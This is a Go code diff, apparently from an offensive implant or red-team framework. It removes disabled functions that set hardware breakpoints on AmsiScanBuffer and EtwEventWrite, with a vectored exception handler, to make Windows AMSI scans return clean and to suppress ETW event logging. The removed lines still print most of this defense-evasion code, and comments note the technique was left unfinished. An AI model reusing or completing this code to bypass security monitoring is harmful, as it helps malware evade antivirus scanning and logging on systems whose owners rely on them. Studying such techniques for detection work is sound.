@@ -89,7 +89,6 @@ var (
 	hwbpGetThreadCtx     = kernel32DLL.NewProc("GetThreadContext")
 	hwbpSetThreadCtx     = kernel32DLL.NewProc("SetThreadContext")
 	hwbpGetCurrentThread = kernel32DLL.NewProc("GetCurrentThread")
-	hwbpAddVEH           = kernel32DLL.NewProc("AddVectoredExceptionHandler")
 	hwbpRemoveVEH        = kernel32DLL.NewProc("RemoveVectoredExceptionHandler")
 )
 
@@ -115,61 +114,6 @@ func HardwareBreakpointAMSI() string {
 	// Rip++ path. It is intentionally disabled so operators are not misled into
 	// believing AMSI is bypassed.
 	return "HWBP AMSI: not implemented (handler needs assembly trampoline; AMSI NOT bypassed)"
-	k32 := syscall.NewLazyDLL("kernel32.dll")
-	getModuleHandle := k32.NewProc("GetModuleHandleW")
-	getProcAddress := k32.NewProc("GetProcAddress")
-
-	namePtr, _ := syscall.UTF16PtrFromString("amsi.dll")
-	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
-	if hMod == 0 {
-		return "HWBP AMSI: amsi.dll not loaded"
-	}
-
-	procName := append([]byte("AmsiScanBuffer"), 0)
-	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
-	if procAddr == 0 {
-		return "HWBP AMSI: AmsiScanBuffer not found"
-	}
-
-	runtime.LockOSThread()
-	defer runtime.UnlockOSThread()
-
-	hThread, _, _ := hwbpGetCurrentThread.Call()
-
-	var ctx hwbpContext
-	ctx.ContextFlags = contextAMD64 | contextDebugRegs
-	ret, _, _ := hwbpGetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
-	if ret == 0 {
-		return "HWBP AMSI: GetThreadContext failed"
-	}
-
-	ctx.Dr0 = uint64(procAddr)
-	ctx.Dr7 |= dr7ExecEnable
-
-	ret, _, _ = hwbpSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
-	if ret == 0 {
-		return "HWBP AMSI: SetThreadContext failed"
-	}
-
-	// Register VEH to intercept the breakpoint exception
-	cb := syscall.NewCallback(hwbpAMSIHandler)
-	veh, _, _ := hwbpAddVEH.Call(1, cb)
-	if veh == 0 {
-		// Clean up DR0
-		ctx.Dr0 = 0
-		ctx.Dr7 &^= dr7ExecEnable
-		hwbpSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
-		return "HWBP AMSI: AddVectoredExceptionHandler failed"
-	}
-
-	hwbpAMSIState = hwbpVEHState{
-		targetAddr:  procAddr,
-		cleanResult: uint64(hwbpAMSIResultClean),
-		vehHandle:   veh,
-		active:      true,
-	}
-
-	return "HWBP AMSI: hardware breakpoint set on AmsiScanBuffer (returns AMSI_RESULT_CLEAN)"
 }
 
 // hwbpAMSIHandler is the VEH callback for AMSI hardware breakpoint interception.
@@ -229,61 +173,6 @@ func HardwareBreakpointETW() string {
 	// Rip++ path. It is intentionally disabled so operators are not misled into
 	// believing ETW is bypassed.
 	return "HWBP ETW: not implemented (handler needs assembly trampoline; ETW NOT bypassed)"
-	k32 := syscall.NewLazyDLL("kernel32.dll")
-	getModuleHandle := k32.NewProc("GetModuleHandleW")
-	getProcAddress := k32.NewProc("GetProcAddress")
-
-	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
-	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
-	if hMod == 0 {
-		return "HWBP ETW: ntdll.dll not loaded"
-	}
-
-	procName := append([]byte("EtwEventWrite"), 0)
-	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
-	if procAddr == 0 {
-		return "HWBP ETW: EtwEventWrite not found"
-	}
-
-	runtime.LockOSThread()
-	defer runtime.UnlockOSThread()
-
-	hThread, _, _ := hwbpGetCurrentThread.Call()
-
-	var ctx hwbpContext
-	ctx.ContextFlags = contextAMD64 | contextDebugRegs
-	ret, _, _ := hwbpGetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
-	if ret == 0 {
-		return "HWBP ETW: GetThreadContext failed"
-	}
-
-	// Use DR1 for ETW (DR0 is for AMSI)
-	ctx.Dr1 = uint64(procAddr)
-	ctx.Dr7 |= (dr7ExecEnable << 2) // Enable DR1 (bits 2-3)
-
-	ret, _, _ = hwbpSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
-	if ret == 0 {
-		return "HWBP ETW: SetThreadContext failed"
-	}
-
-	// Register VEH to intercept the breakpoint exception
-	cb := syscall.NewCallback(hwbpETWHandler)
-	veh, _, _ := hwbpAddVEH.Call(1, cb)
-	if veh == 0 {
-		ctx.Dr1 = 0
-		ctx.Dr7 &^= (dr7ExecEnable << 2)
-		hwbpSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
-		return "HWBP ETW: AddVectoredExceptionHandler failed"
-	}
-
-	hwbpETWState = hwbpVEHState{
-		targetAddr:  procAddr,
-		cleanResult: hwbpETWSuccesStatus,
-		vehHandle:   veh,
-		active:      true,
-	}
-
-	return "HWBP ETW: hardware breakpoint set on EtwEventWrite (returns STATUS_SUCCESS)"
 }
 
 // hwbpETWHandler is the VEH callback for ETW hardware breakpoint interception.
